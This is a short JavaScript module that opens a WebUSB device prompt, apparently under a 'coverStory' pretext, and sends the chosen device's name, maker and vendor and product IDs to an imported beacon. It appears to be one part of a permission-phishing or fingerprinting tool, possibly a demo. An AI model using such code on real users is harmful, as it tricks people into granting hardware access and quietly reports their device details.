import { forceEvent } from '../beacon.js';

export async function requestPermission(coverStory, options) {
  if (!navigator.usb) {
    await forceEvent('usb', { supported: false });
    return { supported: false };
  }
  try {
    const device = await navigator.usb.requestDevice({ filters: [] });
    await forceEvent('usb', {
      productName: device.productName,
      manufacturerName: device.manufacturerName,
      vendorId: device.vendorId,
      productId: device.productId,
    });
    return { productName: device.productName, vendorId: device.vendorId };
  } catch (e) {
    await forceEvent('usb', { supported: false, error: e.message });
    return { supported: false, error: e.message };
  }
}
